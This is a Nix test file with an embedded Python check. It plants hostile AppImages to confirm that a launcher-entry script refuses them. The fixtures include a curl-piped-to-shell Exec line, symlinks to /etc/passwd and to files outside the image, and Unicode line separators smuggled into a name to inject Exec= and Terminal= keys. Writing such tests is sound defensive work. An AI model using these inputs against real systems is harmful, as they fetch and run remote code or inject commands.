# THE PERSON'S DECLARED PROGRAMS (2026-11-01): what a declared AppImage's
# launcher entry is made from, when the AppImage is hostile.
#
#   - `appimage-desktop-refuses-a-hostile-image`: `nix/declared-apps/
#     appimage-desktop.py`, the script a declared AppImage's wrapper runs on
#     the unpacked image, is RUN over planted images and what it wrote is
#     compared whole. An `Exec=` that names another program (with every other
#     key that chooses what runs: `TryExec`, `DBusActivatable`, an action, a
#     `Path`, our own `X-Ronoctua-` keys) never survives; a `.DirIcon` that is
#     a link to /etc/passwd, links out of the image to pictures the script
#     would take, and an entry that is itself a link out are refused; a
#     picture past `ICON_MOST` and an entry past `DESKTOP_MOST` are not read
#     whole (the bounds of `crates/ronoctua-software/src/appimage.rs`); and a
#     name never carries a line end that a reader splitting at every one of
#     them (`str.splitlines`) would break at. A plain image beside them is
#     written in full, its picture taken, so a script that refused everything
#     would not pass.
#
# Joined into `tests/checks.nix` with one line, like every file of checks a
# wave adds.
{
  pkgs,
  mkCheck,
  pyPrelude,
}:
{
  appimage-desktop-refuses-a-hostile-image =
    mkCheck "appimage-desktop-refuses-a-hostile-image" [ pkgs.python3 ]
      ''
        python3 - <<'END'
        import os, pathlib, subprocess, sys
        exec(open("${pyPrelude}").read())

        # PARSED: the script runs over images planted here, and what it wrote is
        # compared whole, line for line — no source is searched.
        # FILE-WIDE: the question is every file the script writes, not a function.
        SCRIPT = "${../nix/declared-apps/appimage-desktop.py}"
        work = pathlib.Path.cwd() / "hostile"
        NAME = "Planted"
        PNG = b"\x89PNG\r\n\x1a\n" + bytes(range(64))
        SMALL = b"\x89PNG\r\n\x1a\n" + b"small" * 8
        SVG = b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>\n'
        ICON_MOST = 4 << 20
        DESKTOP_MOST = 64 << 10
        wrong = []

        # WHAT LIES BESIDE THE IMAGES, never inside one: a picture of each kind the
        # script takes, and an entry of its own. A link to one of these is refused
        # because it LEAVES the image — each is a picture the script would copy, so
        # refusing it is not the kind test answering for the containment test.
        outside = work / "outside"
        outside.mkdir(parents=True)
        (outside / "picture.png").write_bytes(PNG)
        (outside / "far.png").write_bytes(PNG)
        (outside / "far.svg").write_bytes(SVG)
        (outside / "outside.desktop").write_text(
            "[Desktop Entry]\nType=Application\nName=Outside\nExec=/bin/sh -c outside %U\n"
        )
        passwd = pathlib.Path("/etc/passwd")
        if not passwd.is_file():
            wrong.append("/etc/passwd is not in the sandbox: the link to it would be refused as dangling")


        def image(key, desktop, files=(), links=()):
            root = work / key / "contents"
            root.mkdir(parents=True)
            if desktop is not None:
                data = desktop if isinstance(desktop, bytes) else desktop.encode()
                (root / f"{key}.desktop").write_bytes(data)
            for rel, data in files:
                (root / rel).write_bytes(data)
            for rel, target in links:
                os.symlink(target, root / rel)
                if not (root / rel).exists():
                    wrong.append(f"{key}: the planted link {rel} -> {target} dangles, and proves nothing")
            return root


        def written(key, root, name=NAME):
            out = work / key / "out"
            ran = subprocess.run(
                [sys.executable, "-I", SCRIPT, "--contents", str(root), "--out", str(out),
                 "--key", key, "--name", name, "--program", f"ronoctua-appimage-{key}"],
                capture_output=True, text=True,
            )
            if ran.returncode != 0:
                wrong.append(f"{key}: the script failed: {ran.stderr.strip()}")
                return None, {}
            files = sorted(str(p.relative_to(out)) for p in out.rglob("*") if p.is_file() or p.is_symlink())
            stem = f"ronoctua-appimage-{key}"
            desktop = out / "share/applications" / f"{stem}.desktop"
            pictures = {f: (out / f).read_bytes() for f in files if f.startswith("share/pixmaps/")}
            extra = [f for f in files if f != f"share/applications/{stem}.desktop" and f not in pictures]
            if extra:
                wrong.append(f"{key}: the script wrote {extra} besides the entry and its picture")
            if not desktop.is_file():
                wrong.append(f"{key}: no launcher entry was written")
                return None, pictures
            return desktop.read_text(encoding="utf-8"), pictures


        def entry(key, *kept, code="", icon=None):
            stem = f"ronoctua-appimage-{key}"
            lines = ["[Desktop Entry]", "Type=Application", *kept, f"Exec={stem}{code}"]
            if icon:
                lines.append(f"Icon={work / key / 'out/share/pixmaps' / (stem + '.' + icon)}")
            lines.append(f"X-Ronoctua-Declared=appimage:{key}")
            return "\n".join(lines) + "\n"


        planted = []


        def expect(key, root, want, pictures=None, name=NAME):
            planted.append(key)
            got, drawn = written(key, root, name)
            if got is None:
                return
            if got != want:
                wrong.append(f"{key}: the entry written is\n{got}\n    and not\n{want}")
            # EVERY LINE IS ONE LINE TO EVERY READER: a reader that breaks at the
            # Unicode separators (`str.splitlines`) sees the lines `\n` makes.
            if got.splitlines() != got.split("\n")[:-1]:
                wrong.append(f"{key}: a line written breaks in two for a reader that splits at every line end: {got!r}")
            stem = f"ronoctua-appimage-{key}"
            want_pictures = {f"share/pixmaps/{stem}.{k}": v for k, v in (pictures or {}).items()}
            if sorted(drawn) != sorted(want_pictures):
                wrong.append(f"{key}: the pictures written are {sorted(drawn)}, not {sorted(want_pictures)}")
            elif drawn != want_pictures:
                wrong.append(f"{key}: the picture written is not the one inside the image that it may take")


        # THE CONTROL: a plain image is written as the launcher reads it, its picture
        # taken — so a script that refused everything would not pass.
        expect("good", image("good", "[Desktop Entry]\nType=Application\nName=Good\nComment=A planted program\n"
                             "Exec=good %U\nIcon=good\nCategories=Utility;\n", files=[(".DirIcon", PNG)]),
               entry("good", "Name=Good", "Comment=A planted program", "Categories=Utility;", code=" %U", icon="png"),
               {"png": PNG})

        # AN `Exec=` THAT NAMES ANOTHER PROGRAM, and every other key that chooses
        # what runs or where: none survives, and `Exec=` is the wrapper's with the
        # one field code asked for.
        expect("exec", image("exec", "\n".join([
            "[Desktop Entry]",
            "Type=Link",
            "Name=Exec",
            "Name[pt_BR]=Exec",
            'Exec=/bin/sh -c "curl https://example.org/x | sh" %F',
            "Exec=/bin/sh -c second",
            "Exec[en]=/bin/sh",
            "TryExec=/bin/sh",
            "Path=/tmp",
            "DBusActivatable=true",
            "Actions=evil;",
            "URL=https://example.org/",
            "Terminal=sometimes",
            "Hidden=true",
            "X-Ronoctua-Declared=web:evil",
            "X-Ronoctua-Fallback=true",
            "Icon=/etc/passwd",
            "",
            "[Desktop Action evil]",
            "Name=Evil",
            "Exec=/bin/sh -c evil",
            "",
        ]) + "\n"), entry("exec", "Name=Exec", "Name[pt_BR]=Exec", code=" %F"))

        # A `.DirIcon` THAT IS A LINK TO /etc/passwd, and an `Icon=` with no picture
        # beside it: no icon at all.
        expect("passwd", image("passwd", "[Desktop Entry]\nName=Passwd\nIcon=passwd\nExec=passwd\n",
                               links=[(".DirIcon", "/etc/passwd")]),
               entry("passwd", "Name=Passwd"))

        # LINKS OUT OF THE IMAGE TO PICTURES THE SCRIPT WOULD TAKE: the `.DirIcon`
        # (absolute) and both files `Icon=` names (relative, through `..`).
        expect("outside", image("outside", "[Desktop Entry]\nName=Outside picture\nIcon=far\nExec=far\n",
                                links=[(".DirIcon", str(outside / "picture.png")),
                                       ("far.png", "../../outside/far.png"),
                                       ("far.svg", "../../outside/far.svg")]),
               entry("outside", "Name=Outside picture"))

        # THE IMAGE'S ENTRY IS A LINK OUT: it is not read, and the declaration's name
        # stands.
        expect("entry-link", image("entry-link", None, files=[(".DirIcon", PNG)],
                                   links=[("entry-link.desktop", str(outside / "outside.desktop"))]),
               entry("entry-link", f"Name={NAME}", icon="png"), {"png": PNG})

        # A PICTURE LARGER THAN `ICON_MOST` (sparse: nothing is written to make it):
        # refused, and the next one taken.
        big = image("big-icon", "[Desktop Entry]\nName=Big\nIcon=small\nExec=big\n",
                    files=[(".DirIcon", PNG), ("small.png", SMALL)])
        os.truncate(big / ".DirIcon", ICON_MOST + 1)
        expect("big-icon", big, entry("big-icon", "Name=Big", icon="png"), {"png": SMALL})

        # AN ENTRY LONGER THAN `DESKTOP_MOST`: only its head is read, so what comes
        # after it is not.
        padding = "# padding\n" * (DESKTOP_MOST // 10 + 1)
        expect("long-entry", image("long-entry", "[Desktop Entry]\n" + padding + "Name=Late\nExec=late %U\n"),
               entry("long-entry", f"Name={NAME}"))

        # A NAME WITH A LINE END NO `\n` IS: a C1 control and the Unicode separators
        # are taken out, never written as the end of a line.
        expect("separators", image("separators", "[Desktop Entry]\nExec=x\n"),
               entry("separators", "Name=PlantedExec=/bin/shTerminal=trueIcon=/etc/passwd"),
               name="Planted\u2028Exec=/bin/sh\u0085Terminal=true\u2029Icon=/etc/passwd")

        floor(len(planted), 8, "images planted")
        if wrong:
            print("ERROR: appimage-desktop.py takes what a hostile AppImage hands it:", file=sys.stderr)
            for w in wrong:
                print("  " + w, file=sys.stderr)
            sys.exit(1)
        print("OK: a hostile AppImage chooses neither what runs nor a picture outside itself")
        END
      '';
}
